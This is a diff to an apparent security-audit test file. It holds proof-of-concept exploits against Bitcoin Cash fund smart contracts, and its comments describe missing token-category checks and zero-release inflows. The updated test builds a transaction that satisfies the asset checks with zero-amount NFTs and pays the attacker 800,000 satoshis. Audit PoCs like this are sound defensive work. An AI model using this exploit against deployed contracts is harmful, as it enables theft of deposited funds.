@@ -4,8 +4,9 @@
  *  1. TransactionManager.inflow() counts the token amount of every output at the FundManager
  *     address without checking its category, so a foreign token can stand in for fund tokens
  *     and more fund tokens leave than the deposit backs.
- *  1b. A zero-release inflow on a fund with no BCH backing books nothing; the recreated outputs
- *     are not value-pinned.
+ *  1b. TransactionManager.inflow() does not require a positive release, so an inflow can release
+ *     and deposit nothing: its asset outputs only need to carry each asset's category, which an
+ *     immutable NFT of that category (amount 0) does. The recreated outputs are not value-pinned.
  *  2. FundStartup.start() does not constrain the token on its own return output, and
  *     PublicFund.broadcast()'s anti-minting scan skips it, so a broadcast can leave a freshly
  *     minted publicFund minting NFT on the startup contract.
@@ -97,19 +98,23 @@ describe('audit PoCs (v0.1.0-rc2)', () => {
         const fundUtxo = (await fundContract.getUtxos()).find(u => u.token?.category === noSats.category)!;
         const feeUtxo = (await feeContract.getUtxos()).find(u => !u.token)!;
         const funding = randomUtxo({ satoshis: 1_000_000n });
-        provider.addUtxo(attacker.tokenAddress, funding);
+        // Each asset output must carry the asset's category. With nothing released, the only valid
+        // encoding is an immutable NFT of that category (amount 0), which many token categories have.
+        const assetNft = (category: string) => ({ category, amount: 0n, nft: { capability: 'none' as const, commitment: '' } });
+        const nfts = noSats.assets.map(a => randomUtxo({ satoshis: DustAmount, token: assetNft(a.category) }));
+        [funding, ...nfts].forEach(u => provider.addUtxo(attacker.tokenAddress, u));
 
         tx
             .addInput(inflowUtxo, managerContract.unlock.inflow(getFundBin(noSats)))
             .addInput(feeUtxo, feeContract.unlock.pay())
             .addInput(fundUtxo, fundContract.unlock.mint())
-            .addInput(funding, attacker.signatureTemplate.unlockP2PKH())
+            .addInputs([funding, ...nfts], attacker.signatureTemplate.unlockP2PKH())
             .addOutputs([
                 withDust({ to: managerContract.tokenAddress, token: inflowUtxo.token }),
                 withDust({ to: feeContract.tokenAddress }),
                 { to: feeVaultContract.tokenAddress, amount: system.fees.execute.value },
                 withDust({ to: fundContract.tokenAddress, token: { category: noSats.category, amount: fundUtxo.token!.amount } }),
-                ...noSats.assets.map((a, i) => withDust({ to: assetContracts[i]!.tokenAddress, token: { category: a.category, amount: 0n } })),
+                ...noSats.assets.map((a, i) => withDust({ to: assetContracts[i]!.tokenAddress, token: assetNft(a.category) })),
                 { to: attacker.tokenAddress, amount: 800_000n },
             ]);
 
